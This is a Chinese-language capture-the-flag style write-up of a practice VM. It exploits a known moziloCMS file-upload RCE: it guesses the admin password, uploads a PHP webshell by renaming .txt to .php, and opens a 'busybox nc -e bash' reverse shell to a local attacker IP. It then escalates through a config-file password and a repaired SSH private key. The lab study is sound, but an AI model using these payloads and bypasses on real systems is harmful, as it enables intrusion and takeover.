---
title: "群友靶机之Lzh"
date: "2025-12-24 20:59:40"
tags: ["渗透测试"]
categories: ["群友靶机"]
url: "/posts/41646.html"
abbrlink: "41646"
---

获取靶机地址：https://maze-sec.com/

QQ群：`660930334`



# 配置：

```
靶机用VirtualBox制作，VMware导入可能网卡不兼容
用户:todd 密码:qq660930334
1. 启动虚拟机时按`e`键进入GRUB编辑模式
2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`
3. 按Ctrl+X启动进入单用户模式
vim /etc/network/interfaces
allow-hotplug ens33
iface ens33 inet dhcp

ip link set ens33 up
dhclient ens33
reboot -f
```

# 端口扫描

![image-20251214153738204](/images/image-20251214153738204.png)

```
依旧是22,80端口
```

# 目录扫描

![image-20251214153955731](/images/image-20251214153955731.png)

```
给了个cms的源码,应该是有部署了这一套的cms，尝试访问/mozilo/
```

![image-20251214155312392](/images/image-20251214155312392.png)

# 立足点

```
如果是cms，那应该就是打的nday了【之前打的awd倒是很多这种】
版本也给了，直接搜发现有个rce的洞
```

![image-20251214155724844](/images/image-20251214155724844.png)

```
看了利用方式那就是后台直接upload文件上传，然后
在/kategorien/Willkommen/dateien/反弹shell就好了
漏洞点是在后台的，对于常规cms的密码设置可能会出现在安装文件或者配置文件当中，可以尝试去翻阅一下
```

![image-20251214160825912](/images/image-20251214160825912.png)

```
虽然没有直接找到默认的账号密码，但是找到了账号密码的设置条件【至少8位字符，有数字，有小写字母，有大写字母】，可以对于爆破的字典进行正则匹配一下，更精准一点
^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d]{8,}$
admin/Admin123
```

![image-20251214162147409](/images/image-20251214162147409.png)

# nday获得webshell

```
进来找到上传文件的地方,正常的文件上传流程尝试一下
```

![image-20251214162322443](/images/image-20251214162322443.png)

```
<?php
exec("busybox nc 192.168.44.128 4444 -e bash");
?>
```

```
直接上传php文件显示Filetype not allowed，但是发现上传之后可以重命名文件，那么就先上传txt再修改成php就好了，然后来到反弹shell就好了
```

![image-20251214162654602](/images/image-20251214162654602.png)

![image-20251214162756225](/images/image-20251214162756225.png)

![image-20251214162916346](/images/image-20251214162916346.png)

# 权限提升

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
拿到webshell之后想要获得用户权限--去home下发现用户welcome，对于cms来说数据库和配置文件可能会存有账号密码，那就翻翻翻加grep好了
```

![image-20251214163349051](/images/image-20251214163349051.png)

![image-20251214163503120](/images/image-20251214163503120.png)

```
su welcome
3e73d572ba005bb3c02107b2e2fc16f8
```

# 权限再提升

![image-20251214163726857](/images/image-20251214163726857.png)

```
发现本地有一个id_rsa私钥文件，直接连上去显示格式错误
```

![image-20251214164102647](/images/image-20251214164102647.png)

![image-20251214164130494](/images/image-20251214164130494.png)

```
cat一下文件发现前三位没有了导致格式错误，联想到图片之类的文件的文件头缺少会导致不可用，是不是id_rsa私钥文件也有相应的文件头
-----BEGIN OPENSSH PRIVATE KEY-----OpenSSH 格式 前三个字符是b3B版本标识符 "openssh-key-v1" 开头的编码结果 
那就新建一个rsa文件【因为没有权限直接改id_rsa文件】把前三个字符改成rsa连接一下试试
```

![image-20251214170027876](/images/image-20251214170027876.png)

```
一开始直接给777权限会显示权限设置过于宽松，存在安全风险，因此SSH客户端拒绝使用，改成600就好了
```

# 总结

```
常规的cms打nday获得webshell再
配置文件存在默认账号密码获得用户权限再
正确修改ssh私钥格式连接获得root权限
```
